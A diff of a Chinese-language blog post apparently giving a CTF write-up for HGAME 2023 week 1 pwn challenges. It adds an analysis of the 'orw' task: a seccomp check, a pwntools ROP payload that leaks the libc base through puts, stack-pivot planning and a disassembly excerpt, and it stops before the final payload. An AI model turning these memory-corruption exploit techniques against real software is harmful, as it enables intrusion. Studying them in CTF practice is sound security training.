@@ -1,5 +1,5 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>hgame_week1 • StarrySky</title><meta name="description" content="hgame_week1 - StarrySky"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="StarrySky"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="StarrySky" type="application/atom+xml">
-</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="StarrySky"><img class="logo-image" src="/logo.svg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">ABOUT</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">hgame_week1</h1><div class="post-info"><a></a>2023-01-12</div><div class="post-content"><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><p><strong>知识点：</strong>标准输出(close(1))和标准错误(close(2))，有shell但获得不了输出。可以通过exec 1&gt;&amp;0来把标准输出重定向到文件描述符0(标准输入)，这个文件默认是开启的。这样我们就可以看到输出了</p>
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>2023hgame-week1 • StarrySky</title><meta name="description" content="2023hgame-week1 - StarrySky"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="StarrySky"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="StarrySky" type="application/atom+xml">
+</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="StarrySky"><img class="logo-image" src="/logo.svg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">ABOUT</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">2023hgame-week1</h1><div class="post-info"><a></a>2023-01-13</div><div class="post-content"><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><p><strong>知识点：</strong>标准输出(close(1))和标准错误(close(2))，有shell但获得不了输出。可以通过exec 1&gt;&amp;0来把标准输出重定向到文件描述符0(标准输入)，这个文件默认是开启的。这样我们就可以看到输出了</p>
 <p>exec有两个作用</p>
 <ol>
 <li>代替shell执行命令，区别是shell执行完之后会回到shell，而exec会直接退出。</li>
@@ -116,7 +116,29 @@ r.sendlineafter(&#39;please input your name&#39; , p64(one_gadget))
 r.interactive()
 </code></pre>
 <h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><strong>分析：</strong></p>
-<p>可溢出空间为0x30，</p>
-<h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2></div></article></div></main><footer><div class="paginator"><a class="next" href="/2023/01/05/hello-world/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">StarrySky</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
+<p>orw,即利用open、read、write获取flag</p>
+<p>查看sandbox禁用的函数：seccomp-tools dump .&#x2F;文件名 ，本题禁用了execve，因此不能使用execve和system</p>
+<p>本题需要利用shellcraft写入shellcode，缺少可执行段，需要调用mprotect来修改权限，而通过系统调用执行mprotect需要控制寄存器的gadgets，利用ROPgadget不能获得全部所需gadgets，因此需要利用libc中的gadgets，所以第一步泄露libc_base</p>
+<pre><code class="python">p1 = b&#39;a&#39; * (0x100 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+r.sendlineafter(&#39;Maybe you can learn something about seccomp, before you try to solve this task.&#39; , p1)
+puts_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
+li(&#39;puts_addr = &#39; + hex(puts_addr))
+
+libc = ELF(&#39;libc-2.31.so&#39;)
+libc_base = puts_addr - libc.sym[&#39;puts&#39;]
+</code></pre>
+<p>接下来就可以利用ROPgadget得到libc中的gadgets</p>
+<p>由于溢出空间为0x30不足以写orw_rop链，因此要栈迁移</p>
+<p>1.利用如下gadgets控制rbp进行任意地址写到0x404110</p>
+<pre><code>.text:00000000004012CF 48 8D 85 00 FF FF FF          lea     rax, [rbp+buf]
+.text:00000000004012D6 BA 30 01 00 00                mov     edx, 130h                       ; nbytes
+.text:00000000004012DB 48 89 C6                      mov     rsi, rax                        ; buf
+.text:00000000004012DE BF 00 00 00 00                mov     edi, 0                          ; fd
+.text:00000000004012E3 B8 00 00 00 00                mov     eax, 0
+.text:00000000004012E8 E8 93 FD FF FF                call    _read
+</code></pre>
+<p>2.布置payload</p>
+<p>3.<img src="/./2023hgame-week1/1.jpg" alt="1"></p>
+<h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2></div></article></div></main><footer><div class="paginator"></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">StarrySky</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
     Barba.Pjax.start()
 })</script></body></html>
